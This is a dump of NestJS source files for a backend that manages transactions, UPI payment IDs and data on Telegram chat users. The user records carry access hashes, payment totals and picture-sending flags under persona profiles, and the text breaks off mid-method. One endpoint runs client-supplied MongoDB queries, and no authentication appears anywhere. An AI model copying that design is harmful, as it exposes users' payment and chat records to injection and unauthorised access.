})\n  @ApiResponse({\n    status: HttpStatus.NOT_FOUND,\n    description: 'Transaction not found.'\n  })\n  async findOne(@Param('id') id: string): Promise<Transaction> {\n    return this.transactionService.findOne(id);\n  }\n\n  @Get()\n  @ApiOperation({\n    summary: 'Get all transactions',\n    description: 'Retrieves all transactions with optional filtering, pagination and sorting'\n  })\n  @ApiResponse({\n    status: HttpStatus.OK,\n    description: 'Transactions retrieved successfully.',\n    type: [Transaction]\n  })\n  @ApiQuery({ name: 'transactionId', required: false, description: 'Filter by transaction ID (UTR)' })\n  @ApiQuery({ name: 'amount', required: false, type: 'number', description: 'Filter by transaction amount' })\n  @ApiQuery({ name: 'issue', required: false, description: 'Filter by issue type' })\n  @ApiQuery({ name: 'refundMethod', required: false, description: 'Filter by refund method' })\n  @ApiQuery({ name: 'profile', required: false, description: 'Filter by user profile' })\n  @ApiQuery({ name: 'chatId', required: false, description: 'Filter by chat ID' })\n  @ApiQuery({ name: 'ip', required: false, description: 'Filter by IP address' })\n  @ApiQuery({ name: 'status', required: false, description: 'Filter by transaction status' })\n  @ApiQuery({ name: 'limit', required: false, type: 'number', description: 'Number of records to return', example: 10 })\n  @ApiQuery({ name: 'offset', required: false, type: 'number', description: 'Number of records to skip', example: 0 })\n  async findAll(\n    @Query('transactionId') transactionId?: string,\n    @Query('amount') amount?: number,\n    @Query('issue') issue?: string,\n    @Query('refundMethod') refundMethod?: string,\n    @Query('profile') profile?: string,\n    @Query('chatId') chatId?: string,\n    @Query('ip') ip?: string,\n    @Query('status') status?: string,\n    @Query('limit') limit?: number,\n    @Query('offset') offset?: number,\n  ): Promise<{ transactions: Transaction[]; total: number }> {\n    return this.transactionService.findAll(\n      { transactionId, amount, issue, refundMethod, profile, chatId, status, ip },\n      limit,\n      offset\n    );\n  }\n\n  @Put(':id')\n  @ApiOperation({\n    summary: 'Update a transaction',\n    description: 'Updates an existing transaction by its unique identifier'\n  })\n  @ApiParam({\n    name: 'id',\n    description: 'Transaction unique identifier',\n    required: true\n  })\n  @ApiResponse({\n    status: HttpStatus.OK,\n    description: 'Transaction updated successfully.',\n    type: Transaction\n  })\n  @ApiResponse({\n    status: HttpStatus.NOT_FOUND,\n    description: 'Transaction not found.'\n  })\n  @ApiResponse({\n    status: HttpStatus.BAD_REQUEST,\n    description: 'Invalid input data provided.'\n  })\n  async update(\n    @Param('id') id: string,\n    @Body() updateTransactionDto: UpdateTransactionDto,\n  ): Promise<Transaction> {\n    return this.transactionService.update(id, updateTransactionDto);\n  }\n\n  @Delete(':id')\n  @ApiOperation({\n    summary: 'Delete a transaction',\n    description: 'Deletes a transaction by its unique identifier'\n  })\n  @ApiParam({\n    name: 'id',\n    description: 'Transaction unique identifier',\n    required: true\n  })\n  @ApiResponse({\n    status: HttpStatus.OK,\n    description: 'Transaction deleted successfully.',\n    type: Transaction\n  })\n  @ApiResponse({\n    status: HttpStatus.NOT_FOUND,\n    description: 'Transaction not found.'\n  })\n  async delete(@Param('id') id: string): Promise<Transaction> {\n    return this.transactionService.delete(id);\n  }\n}\n","import { Module } from '@nestjs/common';\nimport { MongooseModule } from '@nestjs/mongoose';\nimport { TransactionService } from './transaction.service';\nimport { TransactionController } from './transaction.controller';\nimport { Transaction, TransactionSchema } from './schemas/transaction.schema';\nimport { InitModule } from '../ConfigurationInit/init.module';\n\n@Module({\n  imports: [\n    InitModule,\n    MongooseModule.forFeature([\n      { name: Transaction.name, schema: TransactionSchema },\n    ]),\n  ],\n  controllers: [TransactionController],\n  providers: [TransactionService],\n  exports: [TransactionService]\n})\nexport class TransactionModule {}\n","import { Injectable, NotFoundException, BadRequestException } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model, isValidObjectId } from 'mongoose';\nimport { CreateTransactionDto } from './dto/create-transaction.dto';\nimport { UpdateTransactionDto } from './dto/update-transaction.dto';\nimport { Transaction, TransactionDocument } from './schemas/transaction.schema';\nimport { fetchWithTimeout } from '../../utils/fetchWithTimeout';\nimport { notifbot } from '../../utils/logbots';\nimport { Logger } from '../../utils';\n\n@Injectable()\nexport class TransactionService {\n  private readonly logger = new Logger(TransactionService.name);\n\n  constructor(\n    @InjectModel(Transaction.name) private readonly transactionModel: Model<TransactionDocument>,\n  ) { }\n\n  async create(createTransactionDto: CreateTransactionDto): Promise<Transaction> {\n    this.logger.log(`Creating new transaction: ${JSON.stringify(createTransactionDto)}`);\n    try {\n      // Check if transaction with same ID already exists\n      const existingTransaction = await this.transactionModel\n        .findOne({ transactionId: createTransactionDto.transactionId })\n        .exec();\n\n      if (existingTransaction) {\n        throw new BadRequestException('Transaction with this ID already exists');\n      }\n\n      const newTransaction = new this.transactionModel(createTransactionDto);\n      const savedTransaction = await newTransaction.save();\n      this.logger.log(`Transaction created successfully: ${savedTransaction.transactionId}`);\n      return savedTransaction;\n    } catch (error) {\n      this.logger.error(`Error creating transaction: ${error.message}`, error.stack);\n      throw error instanceof BadRequestException ? error : new BadRequestException('Failed to create transaction');\n    }\n  }\n\n  async findOne(id: string): Promise<Transaction> {\n    this.logger.debug(`Finding transaction by ID: ${id}`);\n    try {\n      const transaction = await this.transactionModel.findById(id).exec();\n      if (!transaction) {\n        this.logger.warn(`Transaction not found with ID: ${id}`);\n        throw new NotFoundException('Transaction not found');\n      }\n      return transaction;\n    } catch (error) {\n      this.logger.error(`Error finding transaction: ${error.message}`, error.stack);\n      if (error instanceof NotFoundException) throw error;\n      throw new BadRequestException('Invalid transaction ID format');\n    }\n  }\n\n  async findAll(\n    filters: {\n      transactionId?: string;\n      amount?: number;\n      issue?: string;\n      refundMethod?: string;\n      profile?: string;\n      chatId?: string;\n      status?: string;\n      ip?: string;\n    },\n    limit = 10,\n    offset = 0,\n  ): Promise<{ transactions: Transaction[]; total: number }> {\n    this.logger.debug(`Finding transactions with filters: ${JSON.stringify(filters)}`);\n    try {\n      let query = {};\n      let transactions: Transaction[] = [];\n      let total = 0;\n\n      // Check each condition sequentially, only moving to the next if no results are found\n      if (filters.transactionId) {\n        // First check transactionId\n        const transactionIdQuery: any = { \n          $or: [\n            { transactionId: filters.transactionId.toLowerCase() }\n          ] \n        };\n        \n        // Only attempt to query by _id if the ID is a valid MongoDB ObjectId\n        if (isValidObjectId(filters.transactionId)) {\n          transactionIdQuery.$or.push({ _id: filters.transactionId });\n        }\n        \n        [transactions, total] = await Promise.all([\n          this.transactionModel\n            .find(transactionIdQuery)\n            .sort({ createdAt: -1 })\n            .skip(offset)\n            .limit(limit)\n            .exec(),\n          this.transactionModel.countDocuments(transactionIdQuery).exec(),\n        ]);\n        \n        if (total > 0) {\n          this.logger.debug(`Found ${total} transactions matching transactionId: ${filters.transactionId}`);\n          await this.sendNotification(filters, total);\n          return { transactions, total };\n        }\n      }\n      \n      if (filters.ip) {\n        // Then check IP if no transaction ID match\n        query = { ip: filters.ip };\n        \n        [transactions, total] = await Promise.all([\n          this.transactionModel\n            .find(query)\n            .sort({ createdAt: -1 })\n            .skip(offset)\n            .limit(limit)\n            .exec(),\n          this.transactionModel.countDocuments(query).exec(),\n        ]);\n        \n        if (total > 0) {\n          this.logger.debug(`Found ${total} transactions matching ip: ${filters.ip}`);\n          await this.sendNotification(filters, total);\n          return { transactions, total };\n        }\n      }\n      \n      if (filters.chatId) {\n        // Then check chatId if no IP match\n        query = { chatId: filters.chatId };\n        \n        [transactions, total] = await Promise.all([\n          this.transactionModel\n            .find(query)\n            .sort({ createdAt: -1 })\n            .skip(offset)\n            .limit(limit)\n            .exec(),\n          this.transactionModel.countDocuments(query).exec(),\n        ]);\n        \n        if (total > 0) {\n          this.logger.debug(`Found ${total} transactions matching chatId: ${filters.chatId}`);\n          await this.sendNotification(filters, total);\n          return { transactions, total };\n        }\n      }\n      \n      // Finally, check remaining filters\n      const remainingFilters = {};\n      \n      if (filters.profile) remainingFilters['profile'] = filters.profile;\n      if (filters.amount) remainingFilters['amount'] = filters.amount;\n      if (filters.issue) remainingFilters['issue'] = filters.issue;\n      if (filters.refundMethod) remainingFilters['refundMethod'] = filters.refundMethod;\n      if (filters.status) remainingFilters['status'] = filters.status;\n      \n      // Only proceed if at least one remaining filter exists\n      if (Object.keys(remainingFilters).length > 0) {\n        query = remainingFilters;\n        \n        [transactions, total] = await Promise.all([\n          this.transactionModel\n            .find(query)\n            .sort({ createdAt: -1 })\n            .skip(offset)\n            .limit(limit)\n            .exec(),\n          this.transactionModel.countDocuments(query).exec(),\n        ]);\n      }\n\n      this.logger.debug(`Found ${total} transactions matching remaining filters`);\n      await this.sendNotification(filters, total);\n      return { transactions, total };\n    } catch (error) {\n      this.logger.error(`Error finding transactions: ${error.message}`, error.stack);\n      throw new BadRequestException('Failed to fetch transactions');\n    }\n  }\n\n  // Helper method to send notification\n  private async sendNotification(filters: any, total: number): Promise<void> {\n    try {\n      await fetchWithTimeout(`${notifbot(process.env.accountsChannel)}&text=${encodeURIComponent(`Found ${total} transactions matching ip: ${filters.ip || 'N/A'}\\nchatId: ${filters.chatId || 'N/A'}\\ntransactionId: ${filters.transactionId || 'N/A'}\\nprofile: ${filters.profile || 'N/A'}`)}`);\n    } catch (error) {\n      this.logger.error(`Failed to send notification: ${error.message}`);\n    }\n  }\n\n  async update(id: string, updateTransactionDto: UpdateTransactionDto): Promise<Transaction> {\n    this.logger.debug(`Updating transaction ${id} with data: ${JSON.stringify(updateTransactionDto)}`);\n    try {\n      const updatedTransaction = await this.transactionModel\n        .findByIdAndUpdate(id, updateTransactionDto, {\n          new: true,\n          runValidators: true\n        })\n        .exec();\n\n      if (!updatedTransaction) {\n        this.logger.warn(`Transaction not found for update with ID: ${id}`);\n        throw new NotFoundException('Transaction not found');\n      }\n\n      this.logger.log(`Transaction ${id} updated successfully`);\n      return updatedTransaction;\n    } catch (error) {\n      this.logger.error(`Error updating transaction: ${error.message}`, error.stack);\n      if (error instanceof NotFoundException) throw error;\n      throw new BadRequestException('Failed to update transaction');\n    }\n  }\n\n  async delete(id: string): Promise<Transaction> {\n    this.logger.debug(`Deleting transaction: ${id}`);\n    try {\n      const deletedTransaction = await this.transactionModel.findByIdAndDelete(id).exec();\n      if (!deletedTransaction) {\n        this.logger.warn(`Transaction not found for deletion with ID: ${id}`);\n        throw new NotFoundException('Transaction not found');\n      }\n      this.logger.log(`Transaction ${id} deleted successfully`);\n      return deletedTransaction;\n    } catch (error) {\n      this.logger.error(`Error deleting transaction: ${error.message}`, error.stack);\n      if (error instanceof NotFoundException) throw error;\n      throw new BadRequestException('Failed to delete transaction');\n    }\n  }\n}\n","export * from './upi-ids.controller';\nexport * from './upi-ids.module';\nexport * from './upi-ids.service';\nexport * from './upi-ids.schema';\n","import { Controller, Get, Body, Patch, UseInterceptors } from '@nestjs/common';\nimport { ApiTags, ApiOperation, ApiBody } from '@nestjs/swagger';\nimport { UpiIdService } from './upi-ids.service';\nimport { CloudflareCache } from '../../decorators';\nimport { CloudflareCacheInterceptor } from '../../interceptors';\n\n@ApiTags('UPI Ids')\n@Controller('upi-ids')\nexport class UpiIdController {\n  constructor(private readonly UpiIdService: UpiIdService) { }\n\n  @Get()\n  @UseInterceptors(CloudflareCacheInterceptor)\n  @CloudflareCache(3600, 60)\n  @ApiOperation({ summary: 'Get Upi Ids' })\n  async findOne(): Promise<any> {\n    return this.UpiIdService.findOne();\n  }\n\n  @Patch()\n  @ApiOperation({ summary: 'Update Upi Ids' })\n  @ApiBody({ type: Object })\n  async update(@Body() updateUpiIdsdto: any): Promise<any> {\n    return this.UpiIdService.update(updateUpiIdsdto);\n  }\n\n}\n","import { Module, Global } from '@nestjs/common';\nimport { MongooseModule } from '@nestjs/mongoose';\nimport { UpiIdService } from './upi-ids.service';\nimport { UpiIdController } from './upi-ids.controller';\nimport { UpiIdSchema } from './upi-ids.schema';\nimport { NpointModule } from '../n-point/npoint.module';\nimport { InitModule } from '../ConfigurationInit';\n\n@Global()\n@Module({\n  imports: [\n    InitModule,\n    UpiIdModule,\n    NpointModule,\n    MongooseModule.forFeature([{ name: 'UpiIdModule', collection: 'upi-ids', schema: UpiIdSchema }]),\n  ],\n  providers: [UpiIdService],\n  controllers: [UpiIdController],\n  exports: [UpiIdService],\n})\nexport class UpiIdModule { }","import { Schema, SchemaFactory } from '@nestjs/mongoose';\nimport mongoose, { Document } from 'mongoose';\n\nexport type UpiIdDocument = UpiId & Document;\n\n@Schema({\n  versionKey: false,\n  autoIndex: true,\n  timestamps: false,\n  toJSON: {\n    virtuals: false,\n    transform: (doc, ret) => {\n      delete ret._id;\n    },\n  },\n})\nexport class UpiId { }\n\nexport const UpiIdSchema = SchemaFactory.createForClass(UpiId);\nUpiIdSchema.add({ type: mongoose.Schema.Types.Mixed });\n\n","import { Injectable, NotFoundException, OnModuleDestroy, OnModuleInit } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport { UpiId } from './upi-ids.schema';\nimport { NpointService } from '../n-point/npoint.service';\nimport { Logger } from '../../utils';\n\n@Injectable()\nexport class UpiIdService implements OnModuleDestroy, OnModuleInit {\n    private readonly logger = new Logger(UpiIdService.name);\n    private checkInterval: NodeJS.Timeout | null = null;\n    private upiIds: any = null;\n    private isInitialized = false;\n    private readonly REFRESH_INTERVAL = 5 * 60 * 1000; // 5 minutes\n    private readonly MAX_RETRIES = 3;\n    private readonly RETRY_DELAY = 1000; // 1 second\n\n    constructor(\n        @InjectModel('UpiIdModule') private readonly upiIdModel: Model<UpiId>,\n        private readonly npointService: NpointService\n    ) {}\n\n    async onModuleInit(): Promise<void> {\n        // this.logger.log('UPI ID Service initializing...');\n        try {\n            await this.initializeService();\n            // this.logger.log('UPI ID Service initialized successfully');\n        } catch (error) {\n            this.logger.error('Failed to initialize UPI ID Service', error.stack);\n            throw error;\n        }\n    }\n\n    onModuleDestroy(): void {\n        // this.logger.log('UPI ID Service shutting down...');\n        if (this.checkInterval) {\n            clearInterval(this.checkInterval);\n            this.checkInterval = null;\n        }\n        // this.logger.log('UPI ID Service shutdown complete');\n    }\n\n    private async initializeService(): Promise<void> {\n        try {\n            // Load initial data\n            await this.refreshUPIs();\n            \n            // Start the periodic check\n            this.startPeriodicCheck();\n            this.isInitialized = true;\n        } catch (error) {\n            this.logger.error('Service initialization failed', error.stack);\n            throw new Error('UPI ID Service initialization failed');\n        }\n    }\n\n    private startPeriodicCheck(): void {\n        if (this.checkInterval) {\n            clearInterval(this.checkInterval);\n        }\n\n        this.checkInterval = setInterval(async () => {\n            try {\n                await Promise.all([\n                    this.refreshUPIs(),\n                    this.checkNpoint()\n                ]);\n            } catch (error) {\n                this.logger.error('Error during periodic check', error.stack);\n            }\n        }, this.REFRESH_INTERVAL);\n    }\n\n    async refreshUPIs(): Promise<void> {\n        try {            \n            const result = await this.executeWithRetry(async () => {\n                return await this.upiIdModel.findOne({}).lean().exec();\n            });\n\n            if (result) {\n                this.upiIds = { ...result }; // Create a copy to avoid mutation\n                // this.logger.debug('UPIs refreshed successfully');\n            } else {\n                this.logger.warn('No UPI data found in database');\n            }\n        } catch (error) {\n            this.logger.error('Failed to refresh UPIs', error.stack);\n            throw error;\n        }\n    }\n\n    async checkNpoint(): Promise<void> {\n        try {\n            // Uncomment and implement when needed\n            /*\n            const upiIds = await this.executeWithRetry(async () => {\n                const response = await axios.get('https://api.npoint.io/54baf762fd873c55c6b1', {\n                    timeout: 10000, // 10 second timeout\n                    headers: {\n                        'User-Agent': 'UpiIdService/1.0'\n                    }\n                });\n                return response.data;\n            });\n\n            const existingUpiIds = await this.findOne();\n            \n            if (existingUpiIds && areJsonsNotSame(upiIds, existingUpiIds)) {\n                this.logger.log('UPI data mismatch detected, updating npoint...');\n                await this.npointService.updateDocument(\"54baf762fd873c55c6b1\", existingUpiIds);\n                this.logger.log('Npoint updated successfully');\n            }\n            */\n        } catch (error) {\n            this.logger.error('Error checking npoint', error.stack);\n            // Don't throw - this is a background task\n        }\n    }\n\n    async findOne(): Promise<any> {\n        if (!this.isInitialized) {\n            throw new Error('Service not initialized. Please wait for initialization to complete.');\n        }\n\n        try {\n            // Return cached data if available\n            if (this.upiIds && Object.keys(this.upiIds).length > 0) {\n                return { ...this.upiIds }; // Return a copy to prevent mutation\n            }\n\n            // Fallback to database query\n            this.logger.debug('Cache miss, fetching from database...');\n            const result = await this.executeWithRetry(async () => {\n                return await this.upiIdModel.findOne({}).lean().exec();\n            });\n\n            if (!result) {\n                this.logger.warn('No UPI data found');\n                return null;\n            }\n\n            this.upiIds = { ...result };\n            this.logger.debug('UPIs fetched and cached');\n            return { ...result };\n            \n        } catch (error) {\n            this.logger.error('Error finding UPI data', error.stack);\n            throw error;\n        }\n    }\n\n    async update(updateClientDto: any): Promise<any> {\n        if (!updateClientDto || typeof updateClientDto !== 'object') {\n            throw new Error('Invalid update data provided');\n        }\n\n        try {\n            // Create a clean copy without _id\n            const updateData = { ...updateClientDto };\n            delete updateData._id;\n\n            this.logger.debug('Updating UPI data...');\n            \n            const updatedUser = await this.executeWithRetry(async () => {\n                return await this.upiIdModel.findOneAndUpdate(\n                    {},\n                    { \n                        $set: { \n                            ...updateData,\n                            updatedAt: new Date() // Add timestamp\n                        } \n                    },\n                    { \n                        new: true, \n                        upsert: true, \n                        lean: true,\n                        runValidators: true // Ensure schema validation\n                    }\n                ).exec();\n            });\n\n            if (!updatedUser) {\n                throw new NotFoundException('Failed to update UPI data');\n            }\n\n            // Update cache\n            this.upiIds = { ...updatedUser };\n            this.logger.log('UPI data updated successfully');\n            \n            return { ...updatedUser };\n\n        } catch (error) {\n            this.logger.error('Error updating UPI data', error.stack);\n            throw error;\n        }\n    }\n\n    private async executeWithRetry<T>(\n        operation: () => Promise<T>,\n        retries: number = this.MAX_RETRIES\n    ): Promise<T> {\n        for (let attempt = 1; attempt <= retries; attempt++) {\n            try {\n                return await operation();\n            } catch (error) {\n                this.logger.warn(`Operation failed on attempt ${attempt}/${retries}`, error.message);\n                \n                if (attempt === retries) {\n                    throw error;\n                }\n                \n                // Exponential backoff\n                const delay = this.RETRY_DELAY * Math.pow(2, attempt - 1);\n                await this.sleep(delay);\n            }\n        }\n        \n        throw new Error('All retry attempts failed');\n    }\n\n    private sleep(ms: number): Promise<void> {\n        return new Promise(resolve => setTimeout(resolve, ms));\n    }\n\n    // Health check method for monitoring\n    getServiceStatus(): { isInitialized: boolean; hasCachedData: boolean; lastUpdate?: Date } {\n        return {\n            isInitialized: this.isInitialized,\n            hasCachedData: this.upiIds !== null && Object.keys(this.upiIds).length > 0,\n            lastUpdate: this.upiIds?.updatedAt\n        };\n    }\n}","import { ApiProperty } from '@nestjs/swagger';\n\nexport class CreateUserDataDto {\n    @ApiProperty({ example: '5787751360', description: 'Chat ID' })\n    chatId: string;\n\n    @ApiProperty({ example: 1, description: 'Total count' })\n    totalCount: number;\n\n    @ApiProperty({ example: 0, description: 'Picture count' })\n    picCount: number;\n\n    @ApiProperty({ example: 1718802722566, description: 'Last message timestamp' })\n    lastMsgTimeStamp: number;\n\n    @ApiProperty({ example: 1718802742567, description: 'Limit time' })\n    limitTime: number;\n\n    @ApiProperty({ example: 0, description: 'Paid count' })\n    paidCount: number;\n\n    @ApiProperty({ example: 0, description: 'Profile count' })\n    prfCount: number;\n\n    @ApiProperty({ example: 1, description: 'Can reply' })\n    canReply: number;\n\n    @ApiProperty({ example: 0, description: 'Pay amount' })\n    payAmount: number;\n\n    @ApiProperty({ example: 0, description: 'highestPayAmount' })\n    highestPayAmount: number;\n\n    @ApiProperty({ example: 0, description: 'cheatCount', default: 0 })\n    cheatCount: number;\n\n    @ApiProperty({ example: 0, description: 'callTime', default: 0 })\n    callTime: number;\n\n    @ApiProperty({ example: '  ', description: 'Username' })\n    username: string;\n\n    @ApiProperty({ example: '-7250939091939055173', description: 'Access hash' })\n    accessHash: string;\n\n    @ApiProperty({ example: true, description: 'Paid reply status' })\n    paidReply: boolean;\n\n    @ApiProperty({ example: false, description: 'Demo given status' })\n    demoGiven: boolean;\n\n    @ApiProperty({ example: false, description: 'Second show status' })\n    secondShow: boolean;\n\n    @ApiProperty({ example: 'sneha', description: 'Profile name' })\n    profile: string;\n\n    @ApiProperty({ example: false, description: 'Pics Sent status' })\n    picsSent: boolean;\n\n    @ApiProperty({ example: [], description: 'videos' })\n    videos: number[];\n}\n","// Export all DTOs\nexport * from './create-user-data.dto';\nexport * from './search-user-data.dto';\nexport * from './update-user-data.dto';\n","import { ApiPropertyOptional } from '@nestjs/swagger';\nimport { Transform, TransformFnParams } from 'class-transformer';\n\nexport class SearchDto {\n  @ApiPropertyOptional({ description: 'Total count', type: Number })\n  totalCount?: number;\n\n  @ApiPropertyOptional({ description: 'Picture count', type: Number })\n  picCount?: number;\n\n  @ApiPropertyOptional({ description: 'Last message timestamp', type: Number })\n  lastMsgTimeStamp?: number;\n\n  @ApiPropertyOptional({ description: 'Limit time', type: Number })\n  limitTime?: number;\n\n  @ApiPropertyOptional({ description: 'Paid count', type: Number })\n  paidCount?: number;\n\n  @ApiPropertyOptional({ description: 'Profile count', type: Number })\n  prfCount?: number;\n\n  @ApiPropertyOptional({ description: 'Can reply', type: Number })\n  canReply?: number;\n\n  @ApiPropertyOptional({ description: 'Pay amount', type: Number })\n  payAmount?: number;\n\n  @ApiPropertyOptional({ description: 'Username' })\n  username?: string;\n\n  @ApiPropertyOptional({ description: 'Access hash' })\n  accessHash?: string;\n\n  @ApiPropertyOptional({ description: 'Paid reply status', type: Boolean })\n  paidReply?: boolean;\n\n  @ApiPropertyOptional({ description: 'Demo given status', type: Boolean })\n  demoGiven?: boolean;\n\n  @ApiPropertyOptional({ description: 'Second show status', type: Boolean })\n  secondShow?: boolean;\n\n  @ApiPropertyOptional({ description: 'Profile name' })\n  @Transform(({ value }: TransformFnParams) => value?.trim().toLowerCase())\n  profile?: string;\n\n  @ApiPropertyOptional({ description: 'Chat ID' })\n  chatId?: string;\n\n  @ApiPropertyOptional({ description: 'Pics Sent status' })\n  picsSent?: boolean;\n}\n","import { PartialType } from '@nestjs/swagger';\nimport { CreateUserDataDto } from './create-user-data.dto';\n\nexport class UpdateUserDataDto extends PartialType(CreateUserDataDto) {}\n","export * from './dto';\nexport * from './schemas';\nexport * from './user-data.controller';\nexport * from './user-data.module';\nexport * from './user-data.service';","// Export all schemas\nexport * from './user-data.schema';\n","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\nimport { Document } from 'mongoose';\n\nexport type UserDataDocument = UserData & Document;\n\n@Schema({\n    collection: 'userData', versionKey: false, autoIndex: true, timestamps: true,\n    toJSON: {\n        virtuals: true,\n        transform: (doc, ret) => {\n            delete ret._id;\n        },\n    },\n})\nexport class UserData {\n    @Prop({ required: true })\n    chatId: string;\n\n    @Prop({ required: true })\n    totalCount: number;\n\n    @Prop({ required: true })\n    picCount: number;\n\n    @Prop({ required: true })\n    lastMsgTimeStamp: number;\n\n    @Prop({ required: true })\n    limitTime: number;\n\n    @Prop({ required: true })\n    paidCount: number;\n\n    @Prop({ required: true })\n    prfCount: number;\n\n    @Prop({ required: true })\n    canReply: number;\n\n    @Prop({ required: true })\n    payAmount: number;\n\n    @Prop({ required: true })\n    username: string;\n\n    @Prop({ required: true })\n    accessHash: string;\n\n    @Prop({ required: true })\n    paidReply: boolean;\n\n    @Prop({ required: true })\n    demoGiven: boolean;\n\n    @Prop({ required: true })\n    secondShow: boolean;\n\n    @Prop({ required: true, default: 0 })\n    fullShow: number;\n\n    @Prop({ required: true })\n    profile: string;\n\n    @Prop({ required: true })\n    picSent: boolean;\n\n    @Prop({ required: true })\n    highestPayAmount: number;\n\n    @Prop({ required: true })\n    cheatCount: number;\n\n    @Prop({ required: true })\n    callTime: number;\n\n    @Prop({ required: false, default:[] })\n    videos: number[];\n}\n\nexport const UserDataSchema = SchemaFactory.createForClass(UserData);\n","import { Controller, Get, Post, Body, Param, Delete, Query, Patch, UseInterceptors } from '@nestjs/common';\nimport { ApiTags, ApiOperation, ApiResponse, ApiQuery, ApiParam, ApiBody } from '@nestjs/swagger';\nimport { UserDataService } from './user-data.service';\nimport { CreateUserDataDto } from './dto/create-user-data.dto';\nimport { UserData } from './schemas/user-data.schema';\nimport { SearchDto } from './dto/search-user-data.dto';\nimport { UpdateUserDataDto } from './dto/update-user-data.dto';\nimport { NoCache } from '../../decorators';\nimport { CloudflareCacheInterceptor } from '../../interceptors';\n\n@ApiTags('UserData of TG clients')\n@Controller('userData')\nexport class UserDataController {\n  constructor(private readonly userDataService: UserDataService) { }\n\n  @Post()\n  @ApiOperation({ summary: 'Create user data', description: 'Creates a new user data entry in the database.' })\n  @ApiBody({ type: CreateUserDataDto, description: 'User data to create' })\n  @ApiResponse({ status: 201, description: 'User data successfully created.', type: UserData })\n  @ApiResponse({ status: 400, description: 'Invalid input data.' })\n  async create(@Body() createUserDataDto: CreateUserDataDto): Promise<UserData> {\n    return this.userDataService.create(createUserDataDto);\n  }\n\n  @Get('search')\n  @ApiOperation({ summary: 'Search user data', description: 'Searches user data based on provided query parameters.' })\n  @ApiQuery({ name: 'profile', required: false, description: 'User profile identifier', type: String, example: 'user123' })\n  @ApiQuery({ name: 'chatId', required: false, description: 'Chat ID associated with the user', type: String, example: 'chat456' })\n  @ApiQuery({ name: 'isTesting', required: false, description: 'Filter for testing users', type: Boolean, example: true })\n  @ApiQuery({ name: 'banned', required: false, description: 'Filter for banned users', type: Boolean, example: false })\n  @ApiResponse({ status: 200, description: 'List of matching user data.', type: [UserData] })\n  @ApiResponse({ status: 400, description: 'Invalid query parameters.' })\n  async search(@Query() query: SearchDto): Promise<UserData[]> {\n    return this.userDataService.search(query);\n  }\n\n  @Get()\n  @ApiOperation({ summary: 'Get all user data', description: 'Retrieves all user data entries from the database.' })\n  @ApiResponse({ status: 200, description: 'List of all user data.', type: [UserData] })\n  async findAll(): Promise<UserData[]> {\n    return this.userDataService.findAll();\n  }\n\n  @Patch('updateAll/:chatId')\n  @ApiOperation({ summary: 'Update all user data by chat ID', description: 'Updates all user data entries associated with a specific chat ID.' })\n  @ApiParam({ name: 'chatId', description: 'Chat ID to update user data for', type: String, example: 'chat456' })\n  @ApiBody({ type: UpdateUserDataDto, description: 'User data fields to update' })\n  @ApiResponse({ status: 200, description: 'User data successfully updated.', type: Object })\n  @ApiResponse({ status: 400, description: 'Invalid input data.' })\n  @ApiResponse({ status: 404, description: 'No user data found for the given chat ID.' })\n  async updateAll(@Param('chatId') chatId: string, @Body() updateUserDataDto: UpdateUserDataDto): Promise<any> {\n    return this.userDataService.updateAll(chatId, updateUserDataDto);\n  }\n\n  @Get(':profile/:chatId')\n  @ApiOperation({ summary: 'Get user data by profile and chat ID', description: 'Retrieves a specific user data entry by profile and chat ID.' })\n  @ApiParam({ name: 'profile', description: 'User profile identifier', type: String, example: 'user123' })\n  @ApiParam({ name: 'chatId', description: 'Chat ID associated with the user', type: String, example: 'chat456' })\n  @ApiResponse({ status: 200, description: 'User data found.', type: UserData })\n  @ApiResponse({ status: 404, description: 'User data not found.' })\n  async findOne(@Param('profile') profile: string, @Param('chatId') chatId: string): Promise<UserData> {\n    return this.userDataService.findOne(profile, chatId);\n  }\n\n  @Patch(':profile/:chatId')\n  @ApiOperation({ summary: 'Update user data by profile and chat ID', description: 'Updates a specific user data entry identified by profile and chat ID.' })\n  @ApiParam({ name: 'profile', description: 'User profile identifier', type: String, example: 'user123' })\n  @ApiParam({ name: 'chatId', description: 'Chat ID associated with the user', type: String, example: 'chat456' })\n  @ApiBody({ type: UpdateUserDataDto, description: 'User data fields to update' })\n  @ApiResponse({ status: 200, description: 'User data successfully updated.', type: UserData })\n  @ApiResponse({ status: 400, description: 'Invalid input data.' })\n  @ApiResponse({ status: 404, description: 'User data not found.' })\n  async update(@Param('profile') profile: string, @Param('chatId') chatId: string, @Body() updateUserDataDto: UpdateUserDataDto): Promise<UserData> {\n    return this.userDataService.update(profile, chatId, updateUserDataDto);\n  }\n\n  @Delete(':profile/:chatId')\n  @ApiOperation({ summary: 'Delete user data by profile and chat ID', description: 'Deletes a specific user data entry identified by profile and chat ID.' })\n  @ApiParam({ name: 'profile', description: 'User profile identifier', type: String, example: 'user123' })\n  @ApiParam({ name: 'chatId', description: 'Chat ID associated with the user', type: String, example: 'chat456' })\n  @ApiResponse({ status: 200, description: 'User data successfully deleted.', type: UserData })\n  @ApiResponse({ status: 404, description: 'User data not found.' })\n  async remove(@Param('profile') profile: string, @Param('chatId') chatId: string): Promise<UserData> {\n    return this.userDataService.remove(profile, chatId);\n  }\n\n  @Get('clear-count')\n  @UseInterceptors(CloudflareCacheInterceptor)\n  @NoCache()\n  @ApiOperation({ summary: 'Clear count for user data', description: 'Clears the count for user data, optionally filtered by chat ID.' })\n  @ApiQuery({ name: 'chatId', required: false, description: 'Chat ID to clear count for', type: String, example: 'chat456' })\n  @ApiResponse({ status: 200, description: 'Count cleared successfully.' })\n  @ApiResponse({ status: 400, description: 'Invalid chat ID.' })\n  clearCount(@Query('chatId') chatId?: string) {\n    return this.userDataService.clearCount(chatId);\n  }\n\n  @Post('query')\n  @ApiOperation({ summary: 'Execute a custom MongoDB query', description: 'Executes a custom MongoDB query with optional sorting, limiting, and skipping.' })\n  @ApiBody({\n    description: 'MongoDB query parameters',\n    schema: {\n      type: 'object',\n      properties: {\n        query: { type: 'object', description: 'MongoDB query object', example: { profile: 'user123' } },\n        sort: { type: 'object', description: 'Sort criteria', example: { createdAt: -1 } },\n        limit: { type: 'number', description: 'Maximum number of results', example: 10 },\n        skip: { type: 'number', description: 'Number of results to skip', example: 0 }\n      }\n    }\n  })\n  @ApiResponse({ status: 200, description: 'Query executed successfully.', type: Object })\n  @ApiResponse({ status: 400, description: 'Invalid query parameters.' })\n  async 